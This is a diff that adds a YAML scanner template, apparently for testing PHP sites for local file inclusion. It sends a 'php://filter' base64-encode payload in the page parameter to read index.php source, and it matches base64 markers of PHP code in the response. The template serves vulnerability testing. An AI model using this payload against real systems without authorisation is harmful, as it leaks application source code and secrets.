@@ -1,0 +1,25 @@
+name: 文件包含测试
+description: 测试本地文件包含漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /index.php
+  params:
+    page: "php://filter/read=convert.base64-encode/resource=index.php"
+    lang: "en"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    Cookie: "session_id=abc123; lang=en"
+response:
+  matchType: contains
+  successIndicators:
+    - "PD9waHAg"
+    - "ZXhhbXBsZSBjb2Rl"
+    - "YmFzZTY0X2VuY29kZWQ="
+  errorIndicators:
+    - "file not found"
+    - "page does not exist"
+    - "access denied"
+  statusCode: 200
